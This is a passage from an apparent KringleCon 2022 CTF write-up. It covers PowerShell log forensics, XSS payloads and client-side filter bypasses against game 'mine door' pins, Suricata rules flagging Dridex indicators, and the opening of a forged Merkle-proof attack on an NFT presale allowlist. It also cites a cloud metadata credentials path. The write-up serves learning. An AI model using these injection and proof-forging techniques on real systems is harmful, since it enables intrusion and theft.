</code></pre><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-12-10-01-44.png alt=Screenshot-from-2022-12-12-10-01-44.png></p><p>Looking at the request URI of fourth packet in the result (packet 32925), we get <code>http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance</code> which is the answer to this challenge.</p><h3 id=windows-event-logs>Windows Event Logs</h3><h5 id=story>Story:</h5><blockquote><p>Grinchum successfully downloaded his keylogger and has gathered the admin credentials! We think he used PowerShell to find the Lembanh recipe and steal our secret ingredient. Luckily, we enabled PowerShell auditing and have exported the Windows PowerShell logs to a flat text file.</p></blockquote><ol><li>What month/day/year did the attack take place? For example, 09/05/2021.</li></ol><p>We will execute the following command to see the number of events associated with each date.
Here&rsquo;s how the following command works:</p><ul><li><code>grep</code> finds all the text patterns that look like dates from <code>powershell.evtx.log</code></li><li><code>sort -u</code> sorts the unique dates</li><li><code>xargs -I %</code> loops over each date entry storing it in the identifier <code>%</code> and executes a shell script (one inside quotes after <code>sh -c</code>)<ul><li><code>printf</code> prints the entry without a newline</li><li><code>grep</code> looks for the lines having the specific date</li><li><code>wc -l</code> counts the lines up</li></ul></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>grep -Po <span style=color:#e6db74>&#34;\d{1,2}/\d{1,2}/\d{4}&#34;</span> powershell.evtx.log | sort -u | xargs -I % sh -c <span style=color:#e6db74>&#39;printf &#34;% &#34;; grep &#34;%&#34; powershell.evtx.log | wc -l&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>10/13/2022 46
</span></span><span style=display:flex><span>10/31/2022 34
</span></span><span style=display:flex><span>11/11/2022 240
</span></span><span style=display:flex><span>11/13/2022 1
</span></span><span style=display:flex><span>11/19/2022 1422
</span></span><span style=display:flex><span>11/25/2022 36
</span></span><span style=display:flex><span>12/13/2022 2088
</span></span><span style=display:flex><span>12/18/2022 36
</span></span><span style=display:flex><span>12/22/2022 2811
</span></span><span style=display:flex><span>12/24/2022 3540
</span></span><span style=display:flex><span>12/4/2022 181
</span></span><span style=display:flex><span>3/18/2015 1
</span></span><span style=display:flex><span>5/16/2018 4
</span></span></code></pre></div><p>We see a large number of events on 12/24/2022 which is very probably the day the attack took place.
Answer: 12/24/2022</p><ol start=2><li>An attacker got a secret from a file. What was the original file&rsquo;s name?</li></ol><p>A file you say? Pretty sure the attacker used <code>get-content</code> to read the file. Why don&rsquo;t we search for that?</p><pre tabindex=0><code>grep -i &#34;get-content&#34; powershell.evtx.log
</code></pre><p>The first result we get has the answer!</p><pre tabindex=0><code>Information     12/24/2022 3:05:23 AM   Microsoft-Windows-PowerShell    4103    Executing Pipeline     &#34;CommandInvocation(Get-Content): &#34;&#34;Get-Content&#34;&#34;                                       
ParameterBinding(Get-Content): name=&#34;&#34;Path&#34;&#34;; value=&#34;&#34;.\Recipe&#34;&#34;
</code></pre><p>Answer: Recipe</p><ol start=3><li>The contents of the previous file were retrieved, changed, and stored to a variable by the attacker. This was done multiple times. Submit the last full PowerShell line that performed only these actions.</li></ol><p>The second last line of the previous command&rsquo;s results can be seen altering the file. We&rsquo;ll submit this line of PowerShell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$foo = Get-Content .\Recipe| % {$_ <span style=color:#f92672>-replace</span> <span style=color:#e6db74>&#39;honey&#39;</span>, <span style=color:#e6db74>&#39;fish oil&#39;</span>} $foo | Add-Content -Path <span style=color:#e6db74>&#39;recipe_updated.txt&#39;</span>
</span></span></code></pre></div><ol start=4><li>After storing the altered file contents into the variable, the attacker used the variable to run a separate command that wrote the modified data to a file. This was done multiple times. Submit the last full PowerShell line that performed only this action.</li></ol><p>We know that this variable is <code>$foo</code> and we can search for it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>grep -i <span style=color:#e6db74>&#34;\$foo&#34;</span> powershell.evtx.log | tail -n <span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>This got me stuck for a while before I realized that Windows event logs are in reverse chronologincal order. So, the correct search command would be:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>grep -i <span style=color:#e6db74>&#34;\$foo&#34;</span> powershell.evtx.log | tac | tail -n <span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>Answer:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$foo | Add-Content -Path <span style=color:#e6db74>&#39;Recipe&#39;</span>
</span></span></code></pre></div><ol start=5><li>The attacker ran the previous command against a file multiple times. What is the name of this file?</li></ol><p>If we skim through the event logs where <code>$foo</code> is being written to a file,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>grep -i <span style=color:#e6db74>&#34;^\$foo | Add-Content&#34;</span> powershell.evtx.log | tac
</span></span></code></pre></div><p>we notice that the attacker also wrote the contents of the variable to &lsquo;Recipe.txt&rsquo;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$foo | Add-Content -Path <span style=color:#e6db74>&#39;recipe_updated.txt&#39;</span>
</span></span><span style=display:flex><span>$foo | Add-Content -Path <span style=color:#e6db74>&#39;Recipe.txt&#39;</span>
</span></span><span style=display:flex><span>$foo | Add-Content -Path <span style=color:#e6db74>&#39;Recipe.txt&#39;</span>
</span></span><span style=display:flex><span>$foo | Add-Content -Path <span style=color:#e6db74>&#39;Recipe.txt&#39;</span>
</span></span><span style=display:flex><span>$foo | Add-Content -Path <span style=color:#e6db74>&#39;Recipe&#39;</span>
</span></span></code></pre></div><p>Answer: Recipe.txt</p><ol start=6><li>Were any files deleted? (Yes/No)</li></ol><p>Here we look for any invocation of the <code>Remove-Item</code> powershell CmdLet.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>grep -i <span style=color:#e6db74>&#34;remove-item&#34;</span> powershell.evtx.log
</span></span></code></pre></div><p>Indeed, we find two invocations of the command, sufficient to conclude that files
were deleted.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>Information     12/24/2022 3:05:51 AM   Microsoft-Windows-PowerShell    4103    Executing Pipeline     &#34;CommandInvocation(Remove-Item): &#34;&#34;Remove-Item&#34;&#34;
</span></span><span style=display:flex><span>ParameterBinding(Remove-Item): name=&#34;&#34;Path&#34;&#34;; value=&#34;&#34;.\recipe_updated.txt&#34;&#34;
</span></span><span style=display:flex><span>        Command Name = Remove-Item
</span></span><span style=display:flex><span>Information     12/24/2022 3:05:42 AM   Microsoft-Windows-PowerShell    4103    Executing Pipeline     &#34;CommandInvocation(Remove-Item): &#34;&#34;Remove-Item&#34;&#34;
</span></span><span style=display:flex><span>ParameterBinding(Remove-Item): name=&#34;&#34;Path&#34;&#34;; value=&#34;&#34;.\Recipe.txt&#34;&#34;
</span></span><span style=display:flex><span>        Command Name = Remove-Item
</span></span></code></pre></div><p>Answer: Yes</p><ol start=7><li>Was the original file (from question 2) deleted? (Yes/No)</li></ol><p>Let&rsquo;s look at the <code>value</code>s for the command invocation we saw in the previous output. These values are &lsquo;recipe_updated.txt&rsquo; and &lsquo;Recipe.txt&rsquo;. The original file from question 2 was called &lsquo;Recipe&rsquo;. This means the file was not deleted.</p><p>Answer: No</p><ol start=8><li>What is the Event ID of the log that shows the actual command line used to delete the file?</li></ol><p>If we look at the output of the previous command with a context of around 16 lines before and after them,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>grep -i <span style=color:#e6db74>&#34;remove-item&#34;</span> powershell.evtx.log -C16
</span></span></code></pre></div><p>We see the Event ID of the command <code>del .\Recipe.txt</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span># --{snip}--
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User Data:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&#34;
</span></span><span style=display:flex><span>Verbose 12/24/2022 3:05:42 AM   Microsoft-Windows-PowerShell    4105    Starting Command      &#34;Started invocation of ScriptBlock ID: b0d4f117-b6d4-449b-a179-2c59d6b4f548
</span></span><span style=display:flex><span>Runspace ID: 4181eda9-20e6-4eb9-8869-fe5fa6d5e663&#34;
</span></span><span style=display:flex><span>Verbose 12/24/2022 3:05:42 AM   Microsoft-Windows-PowerShell    4104    Execute a Remote Command       &#34;Creating Scriptblock text (1 of 1):
</span></span><span style=display:flex><span>del .\Recipe.txt
</span></span></code></pre></div><p>Answer: 4104</p><ol start=9><li>Is the secret ingredient compromised (Yes/No)?</li></ol><p>We can perform a similar contextual analysis with the command in question 2 where the attacker used <code>Get-Content</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>grep -i <span style=color:#e6db74>&#34;get-content&#34;</span> powershell.evtx.log -C16
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span># --{snip}--
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Verbose 12/24/2022 3:01:03 AM   Microsoft-Windows-PowerShell    4105    Starting Command      &#34;Started invocation of ScriptBlock ID: bd6174e2-248d-478b-b948-de16d9c08cdc
</span></span><span style=display:flex><span>Runspace ID: 4181eda9-20e6-4eb9-8869-fe5fa6d5e663&#34;
</span></span><span style=display:flex><span>Verbose 12/24/2022 3:01:03 AM   Microsoft-Windows-PowerShell    4104    Execute a Remote Command       &#34;Creating Scriptblock text (1 of 1):
</span></span><span style=display:flex><span>cat .\Recipe
</span></span></code></pre></div><p>The <code>cat .\Recipe</code> at the end confirms that the secret ingredient was compromised.</p><p>Answer: Yes</p><ol start=10><li>What is the secret ingredient?</li></ol><p>Let&rsquo;s search for the phrase &ldquo;secret ingredient&rdquo; ignoring case-sensitivity.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>grep -i <span style=color:#e6db74>&#34;secret ingredient&#34;</span> powershell.evtx.log | tac
</span></span></code></pre></div><p>We get the following output.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>ParameterBinding(Out-Default): name=&#34;&#34;InputObject&#34;&#34;; value=&#34;&#34;1/2 tsp honey (secret ingredient)&#34;&#34;
</span></span><span style=display:flex><span>ParameterBinding(ForEach-Object): name=&#34;&#34;InputObject&#34;&#34;; value=&#34;&#34;1/2 tsp honey (secret ingredient)&#34;&#34;
</span></span><span style=display:flex><span>ParameterBinding(Add-Content): name=&#34;&#34;Value&#34;&#34;; value=&#34;&#34;1/2 tsp fish oil (secret ingredient)&#34;&#34;  
</span></span><span style=display:flex><span>ParameterBinding(Add-Content): name=&#34;&#34;Value&#34;&#34;; value=&#34;&#34;1/2 tsp fish oil (secret ingredient)&#34;&#34;
</span></span><span style=display:flex><span>ParameterBinding(Out-Default): name=&#34;&#34;InputObject&#34;&#34;; value=&#34;&#34;1/2 tsp fish oil (secret ingredient)&#34;&#34;
</span></span><span style=display:flex><span>ParameterBinding(Out-Default): name=&#34;&#34;InputObject&#34;&#34;; value=&#34;&#34;1/2 tsp honey (secret ingredient)&#34;&#34;
</span></span></code></pre></div><p>Notice how <code>1/2 tsp fish oil</code> is used with <code>Add-Content</code> which indicates that this is the altered secret ingredient. Thus, we choose the first output that was a parameter to <code>Out-Default</code>.</p><p>Answer: <code>1/2 tsp honey</code></p><p>That&rsquo;s it! All ten questions answered.</p><h3 id=boria-mine-door>Boria Mine Door</h3><p>This one challenge was something I found pretty tricky. Here&rsquo;s the layout of the pins, the top rows consisting of pins 1, 2, 3 and the next row having pins 6, 5, 5 from left to right respectively.</p><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-10-15-58-41.png alt=Boria-Mine-Door></p><p>Looking at the pin1 frame source, we get the answer from an HTML comment.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>@&amp;@&amp;&amp;W&amp;&amp;W&amp;&amp;&amp;&amp;
</span></span></code></pre></div><p>We paste this in the pin 1 input field, hit <code>GO</code> and call it done.</p><p>Next, from the frame source of pin 2, we find this comment.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!-- TODO: FILTER OUT HTML FROM USER INPUT --&gt;</span>
</span></span></code></pre></div><p>We can inline CSS as the input, evident from the content security policy <code>default-src 'self';script-src 'self';style-src 'self' 'unsafe-inline'"</code></p><p>Since the connections are white, I&rsquo;ll fill the entire body with white color. We submit this to the input field.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>style</span>&gt;<span style=color:#f92672>body</span>{<span style=color:#66d9ef>background</span>:<span style=color:#ae81ff>#fff</span>}&lt;/<span style=color:#f92672>style</span>&gt;
</span></span></code></pre></div><p>The iframe for pin 3 has content security policy <code>script-src 'self' 'unsafe-inline'; style-src 'self'</code>. This means we can perform the classic <code>&lt;script>...&lt;/script></code> XSS tricks.
Now, instead of solving pin 3, we are going to piggyback off the pin 3 iframe and generate the images for pins 5 and 6. First we&rsquo;ll tackle pin 5.</p><p>Generate the image by submitting the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>script</span>&gt;document.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>style</span>.<span style=color:#a6e22e>background</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;linear-gradient(150deg, #f00 165px, #00f 165px)&#39;</span>;&lt;/<span style=color:#f92672>script</span>&gt;
</span></span></code></pre></div><p>Right click on the image generated and copy the image link. Mine is <code>https://hhc22-novel.kringlecon.com/images/6b5ac53d5c96833fd90136ff742e8728ac3c35be.png</code>.</p><p>Now, for pin 5&rsquo;s input field, we have two ways to go about.</p><p>My favorite is the risky <em><strong>race-against-your-browser</strong></em> technique which I&rsquo;ll demonstrate first. Pin 5&rsquo;s iframe has an onblur event to replace all characters from the charset <code>&lt;"'></code> ignoring the case. This means, on hitting go, the input box loses focus and the characters are replaced. The ignore-case property, which takes ever-so-slightly more time than the normal replace, is where we race against our browser. We submit the following payload three or four times very fast and hopefully our browser fails to replace one of their contents before the request takes flight.
While submitting, we hit the enter key instead of hitting the <code>GO</code> button. <strong>Make sure to rename the image.</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>i</span>&gt;&lt;<span style=color:#f92672>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;images/6b5ac53d5c96833fd90136ff742e8728ac3c35be.png&#34;</span>&gt;#
</span></span></code></pre></div><p>If this fails for your browser, you can resort to removing the callback for the <code>onblur</code> event. We do so by right clicking the input box for pin 5 and going to <code>Inspect</code>. Double click on the <code>onblur</code> attribute for the highlighted input tag and hit backspace to wipe it. Submit the above payload <strong>making sure to rename the image</strong>.</p><p>Next we tackle pin 6. Pin 6&rsquo;s iframe has the CSP <code>script-src 'self'; style-src 'self'</code>.
A quick check using <a href=https://csp-evaluator.withgoogle.com/>CSP evaluator</a> (<a href=https://csp-evaluator.withgoogle.com/>https://csp-evaluator.withgoogle.com/</a>) tells us that <code>script-src 'self'</code> can be problematic if JSONP, Angular or user uploaded files are hosted. Right! We&rsquo;ll generate its image too using pin 3&rsquo;s input box. Submit the following to pin 3&rsquo;s input:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>script</span>&gt;document.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>style</span>.<span style=color:#a6e22e>background</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;linear-gradient(185deg, #0f0 90px, red 90px, red 150px, blue 150px)&#39;</span>;&lt;/<span style=color:#f92672>script</span>&gt;
</span></span></code></pre></div><p>Right click on the image generated and copy the image link. Mine is <code>https://hhc22-novel.kringlecon.com/images/221a8284e6b2eb5af43e74730a83dd943a52b700.png</code>.</p><p>Now we submit the following in pin 6&rsquo;s input to just source the image.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;images/221a8284e6b2eb5af43e74730a83dd943a52b700.png&#34;</span>&gt;
</span></span></code></pre></div><p>Now we submit pin 4&rsquo;s payload. Pin 4 has an <code>onblur</code> event which removes the first instances of the character set <code>&lt;'"></code>. Think pin 5 but easier. To bypass this replace we prepend our style tags with a dummy tag to sacrifice. We submit the following.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span>&gt;&lt;<span style=color:#f92672>style</span>&gt;<span style=color:#f92672>body</span>{<span style=color:#66d9ef>background</span>:linear-gradient(<span style=color:#ae81ff>180</span><span style=color:#66d9ef>deg</span>, <span style=color:#ae81ff>#fff</span> <span style=color:#ae81ff>85</span><span style=color:#66d9ef>px</span>, <span style=color:#ae81ff>#00f</span> <span style=color:#ae81ff>85</span><span style=color:#66d9ef>px</span>);}&lt;/<span style=color:#f92672>style</span>&gt;
</span></span></code></pre></div><p>We can finish off pin 3 which has two blue connection ends and allows inline scripts through its CSP. We submit the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>script</span>&gt;document.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>style</span>.<span style=color:#a6e22e>background</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;blue&#39;</span>&lt;/<span style=color:#f92672>script</span>&gt;
</span></span></code></pre></div><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-10-16-44-36.png alt=Boria-Mine-Door-solved></p><p>That&rsquo;s all for the Boria mine doors. With the <em><strong>race-against-your-browser</strong></em> technique, you can proudly brag that you didn&rsquo;t even need to modify the client side code for any of the challenges.</p><h3 id=suricata-regatta>Suricata Regatta</h3><p>This challenge asks us to write Suricata rules to the <code>suricata.rules</code> file according to the instructions. Once we have the right rules, we can run <code>./rule_checker</code> to check the correctness of our rules. Here are the instructions we encounter:</p><blockquote><ol><li>First, please create a Suricata rule to catch DNS lookups for adv.epostoday.uk.
Whenever there&rsquo;s a match, the alert message (msg) should read Known bad DNS lookup, possible Dridex infection.</li></ol></blockquote><p>We use the alert action on the <code>dns</code> protocol, with hosts and ports as <code>any</code>. We&rsquo;ll keep the <code>msg</code> and <code>dns_query; content</code> field as instructed.</p><pre tabindex=0><code>alert dns any any -&gt; any any (msg:&#34;Known bad DNS lookup, possible Dridex infection&#34;; dns_query; content:&#34;adv.epostoday.uk&#34;;)
</code></pre><blockquote><ol start=2><li>Develop a Suricata rule that alerts whenever the infected IP address 192.185.57.242 communicates with internal systems over HTTP.
When there&rsquo;s a match, the message (msg) should read Investigate suspicious connections, possible Dridex infection</li></ol></blockquote><pre tabindex=0><code>alert http 192.185.57.242 any &lt;&gt; $HOME_NET any (msg:&#34;Investigate suspicious connections, possible Dridex infection&#34;; sid:133701;)
</code></pre><p>Notice we add the Signature ID (<code>sid</code>) of 133701 because otherwise this rule will collide with a pre-existing rule.</p><blockquote><ol start=3><li>We heard that some naughty actors are using TLS certificates with a specific CN.
Develop a Suricata rule to match and alert on an SSL certificate for heardbellith.Icanwepeh.nagoya.
When your rule matches, the message (msg) should read Investigate bad certificates, possible Dridex infection</li></ol></blockquote><p>We will filter on the <code>tls.cert_subject</code> field where the <code>CN</code> matches.</p><pre tabindex=0><code>alert tls any any -&gt; any any (msg:&#34;Investigate bad certificates, possible Dridex infection&#34;; tls.cert_subject; content:&#34;CN=heardbellith.Icanwepeh.nagoya&#34;; sid:133702;)
</code></pre><blockquote><ol start=4><li>OK, one more to rule them all and in the darkness find them.
Let&rsquo;s watch for one line from the JavaScript: let byteCharacters = atob
Oh, and that string might be GZip compressed - I hope that&rsquo;s OK!
Just in case they try this again, please alert on that HTTP data with message Suspicious JavaScript function, possible Dridex infection</li></ol></blockquote><pre tabindex=0><code>alert http any any -&gt; any any (msg:&#34;Suspicious JavaScript function, possible Dridex infection&#34;; http.response_body; content: &#34;let byteCharacters = atob&#34;; sid: 133703;)
</code></pre><p>That concludes the Suricata Regatta challenge.</p><h3 id=blockchain-divination>Blockchain Divination</h3><p>This challenge asks us to use se the Blockchain Explorer in the Burning Ring of Fire to investigate the contracts and transactions on the chain. We are requested to find what address the KringleCoin smart contract is deployed at.</p><p>Let&rsquo;s click on the Blockchain Explorer. Block 0 has nothing of interest. We go to block 1. Block 1 has transaction 0 which creates a contract &ldquo;KringleCoin&rdquo;. We can see the contract address here as <code>0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554</code>.
We submit this in our set of objectives and that solves this challenge. Easy? I&rsquo;ll take it.</p><h3 id=exploit-a-smart-contract>Exploit a Smart Contract</h3><p>This challenge asks us to exploit flaws in a smart contract to buy ourselves a Bored Sporc NFT. Let&rsquo;s go to the presale page of The Bored Sporc Rowboat Society.
The presale price for a Sporc is 100 KringleCoin (KC). At this point, I checked my wallet balance and it turned out to be 455 KC, enough to buy 4 of these NFTs. First we have to pre-approve 100 KC to the address provided.
Looking at the source code of the presale page (hit <code>^u</code> or follow the images), especially <code>https://boredsporcrowboatsociety.com/bsrs.js</code>, we find that the root address of the Merkle tree is being sent in the AJAX POST request.</p><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-12-10-45-37.png alt=Screenshot-from-2022-12-12-10-45-37.png></p><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-12-10-50-19.png alt=Screenshot-from-2022-12-12-10-50-19.png></p><p>Check out the last line of the following snippet from <code>bsrs.js</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75715e>// --{snip}--
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>address</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;wa&#34;</span>).<span style=color:#a6e22e>value</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>proof</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#39;proof&#39;</span>).<span style=color:#a6e22e>value</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>root</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0x52cfdfdcba8efebabd9ecc2c60e6f482ab30bdc6acf8f9bd0600de83701e15f1&#39;</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>xhr</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>XMLHttpRequest</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>xhr</span>.<span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#39;Post&#39;</span>, <span style=color:#e6db74>&#39;cgi-bin/presale&#39;</span>, <span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>xhr</span>.<span style=color:#a6e22e>setRequestHeader</span>(<span style=color:#e6db74>&#39;Content-Type&#39;</span>, <span style=color:#e6db74>&#39;application/json&#39;</span>);
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>xhr</span>.<span style=color:#a6e22e>onreadystatechange</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span>(){
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>xhr</span>.<span style=color:#a6e22e>readyState</span> <span style=color:#f92672>===</span> <span style=color:#ae81ff>4</span>){
</span></span><span style=display:flex><span>	            <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>jsonResponse</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>parse</span>(<span style=color:#a6e22e>xhr</span>.<span style=color:#a6e22e>response</span>);
</span></span><span style=display:flex><span>	            <span style=color:#a6e22e>ovr</span>.<span style=color:#a6e22e>style</span>.<span style=color:#a6e22e>display</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;none&#39;</span>;
</span></span><span style=display:flex><span>	            <span style=color:#a6e22e>in_trans</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>	            <span style=color:#a6e22e>resp</span>.<span style=color:#a6e22e>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jsonResponse</span>.<span style=color:#a6e22e>Response</span>;
</span></span><span style=display:flex><span>			};
</span></span><span style=display:flex><span>		};
</span></span><span style=display:flex><span>	    <span style=color:#a6e22e>xhr</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>({<span style=color:#e6db74>&#34;WalletID&#34;</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>address</span>, <span style=color:#e6db74>&#34;Root&#34;</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>root</span>, <span style=color:#e6db74>&#34;Proof&#34;</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>proof</span>, <span style=color:#e6db74>&#34;Validate&#34;</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>val</span>, <span style=color:#e6db74>&#34;Session&#34;</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>guid</span>}));
</span></span><span style=display:flex><span>	};
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// --{snip}--
</span></span></span></code></pre></div><p>This means we can forge our own Merkle tree and a corresponding proof to barge
into the presale list. Fortunately, if you look around and visit the <em>so-so
hidden</em> chests, one of them links to the repository
<a href=https://github.com/QPetabyte/Merkle_Trees>https://github.com/QPetabyte/Merkle_Trees</a>
by Qwerty Petabyte which has a python script to generate a tree and proof
values. We will clone this repository and install the requirements in it by
running <code>pip install -r requirements.txt</code>. Now, we can choose one of the
&ldquo;owner&rdquo; addresses for the NFTs in the gallery page. We will add this address as
well as our own wallet address to the <code>allowlist</code> of the script. Here, the
first entry is my wallet address and the next is the owner address that we
stole. The script should look something like the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># --{snip}--</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>allowlist <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;0x8077F057E48493a0e96E359aC5f892264196e311&#39;</span>, <span style=color:#e6db74>&#39;0xa1861E96DeF10987E1793c8f77E811032069f8E9&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>leaves <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> address <span style=color:#f92672>in</span> allowlist:
